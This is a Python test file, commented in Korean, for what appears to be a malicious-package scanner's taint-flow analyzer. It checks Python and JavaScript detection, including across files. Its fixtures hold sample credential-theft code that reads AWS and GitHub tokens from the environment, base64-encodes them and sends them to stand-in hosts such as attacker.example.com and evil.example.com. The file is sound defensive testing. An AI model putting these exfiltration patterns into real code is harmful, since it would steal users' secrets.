"""Taint Slicing 단위 + 파이프라인 통합 테스트."""
from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from pkgsentinel.stages.stage1_entry_point import EntryFile
from pkgsentinel.stages.taint_slicer import (
    analyze_file,
    analyze_javascript_cross_file,
    analyze_python,
    analyze_python_cross_file,
    slice_for_llm,
)

# 실제 악성 패턴 - credential theft + reverse shell
MALICIOUS_SAMPLE = '''
import os
import base64
import requests
import subprocess


def collect_and_send():
    aws_key = os.environ.get("AWS_ACCESS_KEY_ID")
    github = os.environ.get("GITHUB_TOKEN")
    encoded = base64.b64encode((aws_key + ":" + github).encode())
    requests.post(
        "https://attacker.example.com/c2",
        data=encoded,
        verify=False,
    )


def remote_exec():
    out = subprocess.check_output(["whoami"])
    requests.put("https://x.example.com/upload", data=out)


def via_obfuscation():
    secret = __import__("os").environ.get("API_KEY")
    payload = base64.b64encode(secret.encode())
    __import__("requests").post("https://evil.example.com", data=payload)
'''

# 정상 코드 - taint flow 없어야 함
BENIGN_SAMPLE = '''
import json
import requests


def fetch_data(url):
    resp = requests.get(url)
    return json.loads(resp.text)


def main():
    data = fetch_data("https://api.example.com/items")
    print(data)
'''


def test_malicious():
    rpt = analyze_python(MALICIOUS_SAMPLE)
    print(f"[MALICIOUS] flows: {len(rpt.flows)}")
    for f in rpt.flows:
        print(f"  - {f.to_summary()}")
        print(f"    var={f.tainted_var}, source@L{f.source_line}, sink@L{f.sink_line}")
        if f.transforms:
            print(f"    transforms={f.transforms}")

    expected_min = 2  # 최소 두 가지 흐름은 잡혀야 함
    assert len(rpt.flows) >= expected_min, \
        f"expected >= {expected_min}, got {len(rpt.flows)}"
    print(f"  OK (>= {expected_min} flows)")


def test_benign():
    rpt = analyze_python(BENIGN_SAMPLE)
    print(f"\n[BENIGN] flows: {len(rpt.flows)}")
    for f in rpt.flows:
        print(f"  FAIL: unexpected flow {f.to_summary()}")
    assert not rpt.flows
    print("  OK - taint flow 없음")


def test_slice_format():
    rpt = analyze_python(MALICIOUS_SAMPLE)
    sliced = slice_for_llm(MALICIOUS_SAMPLE, rpt.flows)
    print(f"\n[SLICE] length: {len(sliced)} chars")
    print(sliced[:600])
    assert "Flow #1" in sliced and "->" in sliced, "포맷 이상"
    print("  OK - slice 포맷 정상")


# ─────────────── cross-file ───────────────

CROSS_CONFIG = '''
import os
SECRET = os.environ.get("AWS_KEY")
TOKEN = os.environ.get("GITHUB_TOKEN")
NORMAL = "hello"
'''

CROSS_USER = '''
import requests
from mypkg.config import SECRET, NORMAL

def upload():
    requests.post("https://attacker.example.com", data=SECRET)
    requests.get("https://api.example.com", params={"hi": NORMAL})  # 정상
'''


def test_cross_file_basic():
    print("\n[CROSS-FILE] config exports SECRET, user imports + sinks")
    sources = {
        "mypkg/config.py": CROSS_CONFIG,
        "mypkg/user.py": CROSS_USER,
    }
    reports = analyze_python_cross_file(sources)
    user_flows = reports["mypkg/user.py"].flows
    print(f"  user.py flows: {len(user_flows)}")
    for f in user_flows:
        print(f"    - {f.to_summary()} (var={f.tainted_var})")
    # cross-file 마커 또는 SECRET sink 흐름이 있어야
    assert any(
        f.tainted_var == "SECRET" and "requests.post" in f.sink_call
        for f in user_flows
    ), f"expected SECRET→requests.post flow, got {user_flows}"
    # NORMAL 은 source 가 아니라 흐름 없어야
    assert not any(f.tainted_var == "NORMAL" for f in user_flows)
    print("  OK")


def test_cross_file_no_match():
    """import 가 다른 모듈을 가리키면 taint 가 흐르지 않아야."""
    print("\n[CROSS-FILE] mismatched import → no flow")
    sources = {
        "mypkg/config.py": CROSS_CONFIG,
        "mypkg/user.py": '''
import requests
from someother.module import SECRET
requests.post("https://x.com", data=SECRET)
''',
    }
    reports = analyze_python_cross_file(sources)
    flows = reports["mypkg/user.py"].flows
    assert not flows, f"unexpected cross-file flow: {flows}"
    print("  OK no flow propagated to wrong import target")


# ─────────────── JS cross-file ───────────────

JS_CONFIG = '''
const SECRET = process.env.AWS_KEY;
const TOKEN = process.env.GITHUB_TOKEN;
const NORMAL = "hello";
module.exports = { SECRET, TOKEN, NORMAL };
'''

JS_USER = '''
const { SECRET, NORMAL } = require('./config');
fetch('https://attacker.example.com', { body: SECRET });
fetch('https://api.example.com', { body: NORMAL });
'''


def test_cross_file_basic_js():
    print("\n[JS CROSS-FILE] config exports SECRET, user imports + fetch sink")
    sources = {
        "mypkg/config.js": JS_CONFIG,
        "mypkg/user.js": JS_USER,
    }
    reports = analyze_javascript_cross_file(sources)
    user_flows = reports["mypkg/user.js"].flows
    print(f"  user.js flows: {len(user_flows)}")
    for f in user_flows:
        print(f"    - {f.to_summary()} (var={f.tainted_var})")
    assert any(
        f.tainted_var == "SECRET" and "fetch" in f.sink_call
        for f in user_flows
    ), f"expected SECRET→fetch flow, got {user_flows}"
    assert not any(f.tainted_var == "NORMAL" for f in user_flows)
    # cross-file 마커 확인
    assert any(
        any("cross-file" in t for t in f.transforms) for f in user_flows
    ), "expected <cross-file from ...> transform marker"
    print("  OK")


def test_cross_file_no_match_js():
    """JS import 가 sources 에 없는 모듈을 가리키면 taint 흐르지 않아야."""
    print("\n[JS CROSS-FILE] mismatched module path → no flow")
    sources = {
        "mypkg/config.js": JS_CONFIG,
        "mypkg/user.js": '''
const { SECRET } = require('./someother-module');
fetch('https://x.com', { body: SECRET });
''',
    }
    reports = analyze_javascript_cross_file(sources)
    flows = reports["mypkg/user.js"].flows
    assert not flows, f"unexpected cross-file flow: {flows}"
    print("  OK no flow propagated to wrong import target")


# ─────────────── analyze_file: 단일파일 JS ───────────────

_JS_SINGLE_MAL = '''
const secret = process.env.AWS_KEY;
fetch('https://attacker.example.com', { body: secret });
'''

_JS_SINGLE_BEN = '''
const name = "hello";
console.log(name);
'''


def test_analyze_file_js_single_malicious():
    """analyze_file 의 JS 분기 — within-file source→sink 흐름 잡힘."""
    print("\n[analyze_file JS] within-file process.env -> fetch")
    ef = EntryFile(
        path="evil.js", basename="evil.js",
        content=_JS_SINGLE_MAL, size=len(_JS_SINGLE_MAL),
        language="javascript",
    )
    rpt = analyze_file(ef)
    print(f"  flows: {len(rpt.flows)}")
    for f in rpt.flows:
        print(f"    - {f.to_summary()} (var={f.tainted_var})")
    # secret -> fetch 흐름 검출
    assert any(
        "fetch" in f.sink_call and f.tainted_var == "secret"
        for f in rpt.flows
    ), f"expected secret→fetch flow, got {rpt.flows}"
    print("  OK")


def test_analyze_file_js_single_benign():
    print("\n[analyze_file JS] benign single file → no flow")
    ef = EntryFile(
        path="util.js", basename="util.js",
        content=_JS_SINGLE_BEN, size=len(_JS_SINGLE_BEN),
        language="javascript",
    )
    rpt = analyze_file(ef)
    assert not rpt.flows, f"unexpected flows: {rpt.flows}"
    print("  OK no flows")


def main():
    tests = [test_malicious, test_benign, test_slice_format,
             test_cross_file_basic, test_cross_file_no_match,
             test_cross_file_basic_js, test_cross_file_no_match_js,
             test_analyze_file_js_single_malicious,
             test_analyze_file_js_single_benign]
    failed = 0
    for t in tests:
        try:
            t()
        except Exception:
            import traceback
            traceback.print_exc()
            failed += 1
    print("\n" + ("ALL OK" if failed == 0 else f"FAILED: {failed}"))


if __name__ == "__main__":
    main()
